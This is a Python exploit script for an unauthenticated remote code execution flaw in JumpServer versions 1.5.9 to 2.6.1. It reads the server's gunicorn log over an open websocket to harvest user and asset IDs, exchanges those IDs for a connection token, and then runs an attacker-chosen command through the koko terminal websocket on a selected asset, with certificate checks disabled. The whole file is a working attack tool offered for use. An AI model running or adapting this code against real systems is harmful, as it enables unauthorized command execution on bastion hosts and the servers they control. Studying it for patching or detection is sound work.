#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
#
# jumpserver-v2.x-unauth-idl-rce
# Copyright (C) 2020  kmahyyg @ PatMeow Ltd.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#


import argparse
import asyncio
import copy
import json
import logging
import re
import ssl
from datetime import datetime
from urllib.parse import urlparse, parse_qs

import requests
import websockets

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(name)s | [%(levelname)s]: %(message)s")
basicLogger = logging.getLogger('exploit')
readLogLogger = logging.getLogger('remotelog')
stage2Logger = logging.getLogger('stage2')
stage3Logger = logging.getLogger('stage3')

# ----- DO NOT CHANGE, POST ---[BLOCK START]---
PATH_PAYLOAD_1 = '/ws/ops/tasks/log/'
PATH_PAYLOAD_2 = '/api/v1/users/connection-token/?user-only=1'
PATH_PAYLOAD_2_ALT = '/api/v1/authentication/connection-token/?user-only=1'
REFERER_PAYLOAD_2 = '/luna/?_={tms}'.format(tms=str(int(datetime.timestamp(datetime.now()))))

GLOBAL_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
}
GLOBAL_TIMEOUT = 5

# Stage 3, HTTP, Switching to WS
PATH_PAYLOAD_3 = '/koko/ws/token/?target_id={tid}'
# ----- DO NOT CHANGE, POST ---[BLOCK END]---

# User MODIFICATION PART
# This should be changed according to current situation

# Stage 1
PAYLOAD_1 = '{"task":"/opt/jumpserver/logs/gunicorn"}'
RETRYCOUNT_THRESHOLD = 500  # This is the max number of frames received from WS Logging stream
# If after RETRYCOUNT_THRESHOLD frames, the related data still cannot be found, it will get stuck.
COUNT_THRESHOLD = 10  # This is the number of assets id retrieve threshold AT LEAST, it seems that should not need to change
# seems that the program either has bug or unknown reason, only tracked the 13?-latest log lines.
# If it CANNOT find enough number of COUNT_THRESHOLD assets, it will get stuck.

# Stage 2
PATH_PAYLOAD_2_USE = PATH_PAYLOAD_2


# MAIN PROGRAM START HERE, DON'T CHANGE

class BasicInfo(object):
    def __init__(self, oriurl):
        self.ssl = None
        data = urlparse(oriurl)
        if data.scheme == 'https':
            basicLogger.debug("SSL Detected!")
            self.ssl = self.getDisabledSSLVerificationContext()
        elif data.scheme == 'http':
            basicLogger.debug("Non-SSL Detected!")
        else:
            raise ValueError("URL Scheme is not supported.")
        self.host = data.netloc

    @staticmethod
    def getDisabledSSLVerificationContext():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    # Return [URL, SSL, HEADER, POSTDATA]
    def getVulnURL(self, step):
        if self.ssl:
            schema_h = 'https://'
            schema_w = 'wss://'
        else:
            schema_h = 'http://'
            schema_w = 'ws://'

        if step == 1:
            # Get Log
            return [schema_w + self.host + PATH_PAYLOAD_1, self.ssl, GLOBAL_HEADERS, PAYLOAD_1]
        elif step == 2:
            nheader = copy.deepcopy(GLOBAL_HEADERS)
            nheader['Referer'] = REFERER_PAYLOAD_2
            stage2Logger.info("-------------------------------------------------------------------------")
            # Get Token Alternative Way
            stage2Logger.info("If default request for token exchanging is failed, try again.")
            stage2Logger.info(" You should see :  `!!!! FAILED !!!!` notification BEFORE you try again.")
            stage2Logger.info("Possible Reason: Previous Token Expired, OR API Endpoint blocked.")
            stage2Logger.info("Try: Re-run this program or change PATH_PAYLOAD_2_USE to PATH_PAYLOAD_2_ALT.")
            stage2Logger.info("-------------------------------------------------------------------------")
            # Get Token
            return [schema_h + self.host + PATH_PAYLOAD_2_USE, self.ssl, nheader, {}]
        elif step == 3:
            # Start RCE
            # WARNING: NON-STANDARD OPERATION HERE, YOU SHOULD USE SCHEMA_H IF POSSIBLE AND ALSO IN BROWSER
            return [schema_w + self.host + PATH_PAYLOAD_3, self.ssl, GLOBAL_HEADERS, {}]
        else:
            raise RuntimeError("Internal Function Error. Contact Author.")

    def setattr(self, name, value):
        self.__setattr__(name, value)


def utils_printlst(data: list):
    # Note: Since the log is growing and rotating, you might want to select the latest asset,
    # so everything can work fine.
    stage2Logger.info("---------------------START SELECT ASSET YOU WANNA HACK ------------------------------")
    stage2Logger.info("Use the number before the URL:")
    for i in range(len(data)):
        print("{asno}: {asdt}".format(asno=i, asdt=data[i]))
    stage2Logger.info("----------------------DONE SELECT ASSET YOU WANNA HACK ------------------------------")


async def runWS_stream(url, ssl, payload):
    async with websockets.connect(url, ssl=ssl) as wsapp:
        count = 0
        finalurl = ''
        retrycount = 0
        await wsapp.send(payload)
        while True:
            resp = await wsapp.recv()
            try:
                msg = json.loads(resp)['message']
                retrycount += 1
                readLogLogger.debug("Current Retry Count: {}".format(retrycount))
                if '/api/v1/perms/asset-permissions/user/validate/?action_name=connect&asset_id=' in msg:
                    readLogLogger.info("Found 1 asset! Processing...")
                    buffer = msg
                    # Receive next frame to avoid truncated message
                    resp = await wsapp.recv()
                    buffer += json.loads(resp)['message']
                    pattern = re.compile(r'\/api\/v1\/perms\/asset-permissions\/user\/validate\/(.*? )')
                    m = pattern.search(buffer)
                    finalurl += m.group()[:-1]
                    finalurl += '\r\n'
                    count += 1
                    readLogLogger.info("Assets Processing Done. Wait for next assets or jump out...")
                if count > COUNT_THRESHOLD - 1 or retrycount > RETRYCOUNT_THRESHOLD:
                    break
            except:
                pass
        return finalurl


async def runWS_rce(url, ssl, payload):
    stage3Logger.debug("INIT: START CONNECTION")
    async with websockets.connect(url, ssl=ssl) as wsapp:
        # start connection, get current ws session id
        wsdt = await wsapp.recv()
        wsid = json.loads(wsdt)["id"]
        stage3Logger.debug("GET WS SESSION ID: {}".format(wsid))
        # build command prototype
        cmdtmpl = copy.deepcopy(json.loads(wsdt))
        cmdtmpl["type"] = ""
        cmdtmpl["data"] = ""
        currcmd = copy.deepcopy(cmdtmpl)
        # init terminal tty
        stage3Logger.debug("INIT TERMINAL")
        currcmd["type"] = "TERMINAL_INIT"
        currcmd["data"] = json.dumps({"cols": 125, "rows": 35})
        await wsapp.send(json.dumps(currcmd))
        # recv 5 msg
        pingmsg = ""
        stage3Logger.warning("Please wait patiently, it might cost about 1min...")
        for i in range(5):
            initmsg = await wsapp.recv()
            if json.loads(initmsg)["type"] == "PING":
                pingmsg = initmsg
                stage3Logger.info("Answering heartbeat, please wait...")
                await wsapp.send(initmsg)
            print(json.loads(initmsg)["data"])
        # prevent further issue, send a ping before rce
        await wsapp.send(pingmsg)
        # execute cmd
        currcmd["type"] = "TERMINAL_DATA"
        currcmd["data"] = payload + "\r\n"
        stage3Logger.info("Code Execution Done! Receiving reply...")
        stage3Logger.warning(
            "This program cannot recognize the end of reply, if you see the response you need, just ^C to kill it.")
        await wsapp.send(json.dumps(currcmd))
        # execute done
        # recv 50 resp
        for i in range(50):
            initmsg = await wsapp.recv()
            print(json.loads(initmsg)["data"])


class STEP1(object):
    def __init__(self, upper):
        self.upper = upper

    def run(self):
        req = self.upper.getVulnURL(1)
        self.loop = asyncio.get_event_loop()
        data = self.loop.run_until_complete(runWS_stream(req[0], req[1], req[3]))
        finalurl = data
        dtlist = finalurl.split('\r\n')[:-1]
        utils_printlst(dtlist)
        print("\r\n")
        selected_user = int(input("Choose one you want to hack? (int)"))
        selectedurl = dtlist[selected_user]
        keyid = parse_qs(urlparse(selectedurl, scheme='http').query)
        try:
            keydata = {"user": keyid['user_id'][0], "system_user": keyid['system_user_id'][0],
                       "asset": keyid['asset_id'][0]}
            self.upper.setattr('payload2_post', keydata)
        except:
            raise ValueError("Token not found.")


class STEP2(object):
    def __init__(self, upper):
        self.upper = upper

    def run(self):
        stage2Logger.info("Due to the time limitation and expiration of token:")
        stage2Logger.info("Please input the command you wanna execute at the very beginning: ")
        print("\r\n")
        self.upper.setattr('s3cmd', input("Execute Command? "))
        currurl, currssl, currheader, currpayl = self.upper.getVulnURL(2)
        r = requests.post(verify=False, headers=currheader, url=currurl, json=self.upper.payload2_post)
        try:
            self.upper.setattr('s2token', r.json()['token'])
        except:
            print(r.json())
            raise RuntimeError("Unknown internal Error.")


class STEP3(object):
    def __init__(self, upper):
        self.upper = upper

    def run(self):
        currurl, currssl, currheader, currpayl = self.upper.getVulnURL(3)
        currurl = currurl.format(tid=self.upper.s2token)
        self.loop = asyncio.get_event_loop()
        self.loop.run_until_complete(runWS_rce(currurl, currssl, self.upper.s3cmd))


def __main__():
    parser = argparse.ArgumentParser(
        description="JumpServer v1.5.9~2.4.5 v2.5.x~v2.5.4 v2.6.x~v2.6.1 Unauthenticated RCE")
    parser.add_argument("host", default="http://127.0.0.1:8080", type=str,
                        help="JumpServer Location (http[s]://IP Addr:PORT)")
    args = parser.parse_args()
    basicLogger.warning("Note: If you use SSL, Cert Verification is disabled.")
    basicLogger.debug("User Offered Connection Info:", args.host)
    # https://websockets.readthedocs.io/en/stable/limitations.html?highlight=proxy#limitations
    # Note: This library does NOT support proxy. So please `proxychains` yourself.
    binfo = BasicInfo(args.host)
    action1 = STEP1(binfo)
    action1.run()
    action2 = STEP2(binfo)
    action2.run()
    action3 = STEP3(binfo)
    action3.run()


if __name__ == '__main__':
    __main__()
